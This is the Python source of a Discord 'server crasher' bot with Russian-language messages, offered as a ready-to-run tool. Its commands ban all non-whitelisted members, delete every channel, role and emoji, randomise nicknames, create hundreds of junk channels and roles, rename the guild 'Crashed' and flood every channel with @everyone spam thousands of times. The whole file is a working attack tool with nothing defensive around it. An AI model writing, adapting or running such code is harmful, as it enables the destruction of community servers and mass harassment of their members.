import discord
from discord.ext import commands
import asyncio
import random
import string
 
intents = discord.Intents.default()
intents.members = True

prefix = '!'
wl = [your_id, friend_id]
 
client = commands.Bot(command_prefix = prefix, intents = intents)


async def banall(ctx):
	for member in ctx.guild.members:
		if member.id not in wl:
			try:
				member.ban()
			except:
				continue
		elif member.id in wl:
			continue

async def clearch(ctx):
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
		except:
			continue

async def clearrl(ctx):
	for role in ctx.guild.roles:
		try:
			await role.delete()
		except:
			continue

async def masks(ctx):
	chars = string.ascii_letters + string.digits

	for member in ctx.guild.members:
		nickname = ''.join((random.choice(chars) for i in range(16)))

		try:
			await member.edit(nick=nickname)
		except:
			continue

async def createch(ctx):
	channel_num = 0

	for b in range(200):
		channel_num += 1

		try:
			await ctx.guild.create_text_channel(channel_num, reason = 'server crashed')
		except:
			continue

async def createrl(ctx):
	role = 0

	for a in range(200):
		role += 1

		try:
			await ctx.guild.create_role(name = role)
		except:
			continue

async def clearemj(ctx):
	for emoji in list(ctx.guild.emojis):
		try:
			await emoji.delete()
		except:
			continue

async def msgspam(ctx):
	for a in range(10000):
		for channel in ctx.guild.channels:
			try:
				await channel.send('@everyone сервер был крашнут!')
			except:
				continue

async def autocrashstart(ctx):
	for channel in ctx.guild.channels:
		for a in range(10):
			try:
				await channel.send('@everyone СЕРВЕР БУДЕТ КРАШНУТ ЧЕРЕЗ 5 СЕКУНД!')
			except:
				continue

	await ctx.guild.edit(name = 'Crashed')

	asyncio.create_task(clearch(ctx))
	asyncio.create_task(clearch(ctx))
	asyncio.create_task(clearch(ctx))

async def autocrash(ctx):
	asyncio.create_task(autocrashstart(ctx))
	asyncio.create_task(banall(ctx))
	asyncio.create_task(banall(ctx))
	asyncio.create_task(banall(ctx))
	asyncio.create_task(banall(ctx))
	asyncio.create_task(banall(ctx))
	asyncio.create_task(clearrl(ctx))
	asyncio.create_task(clearrl(ctx))
	asyncio.create_task(clearrl(ctx))
	asyncio.create_task(clearrl(ctx))
	asyncio.create_task(clearrl(ctx))
	await clearrl(ctx)

	asyncio.create_task(createch(ctx))
	asyncio.create_task(createch(ctx))
	asyncio.create_task(createch(ctx))
	asyncio.create_task(createch(ctx))
	asyncio.create_task(createch(ctx))
	asyncio.create_task(createrl(ctx))
	asyncio.create_task(createrl(ctx))
	asyncio.create_task(createrl(ctx))
	asyncio.create_task(createrl(ctx))
	asyncio.create_task(createrl(ctx))
	asyncio.create_task(createrl(ctx))
	await clearrl(ctx)

	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))
	asyncio.create_task(msgspam(ctx))

	for channel in ctx.guild.channels:
		try:
			await channel.send('СЕРВЕР УМЕР!')
		except:
			continue


@client.command()
async def auto(ctx):
	asyncio.create_task(autocrash(ctx))

@client.command()
async def roles(ctx):
	await ctx.send('Удаляем роли...')
	asyncio.create_task(clearrl(ctx))
	await clearrl(ctx)
	await ctx.send('Почистил!')

@client.command()
async def channels(ctx):
	await ctx.send('Удаляем каналы...')
	asyncio.create_task(clearch(ctx))
	await ctx.guild.create_text_channel('alived-channel', reason = 'clearch command')
	for channel in ctx.guild.channels:
		await channel.send('Почистил')

@client.command()
async def spam(ctx):
	await ctx.send('Начинаю спам...')
	asyncio.create_task(msgspam(ctx))
	await ctx.send('Наспамил!')

@client.event
async def on_ready():
	await client.change_presence(status = discord.Status.online, activity = discord.Game(name = f'{prefix}help'))
	print('Бот запущен!')



client.run('token')
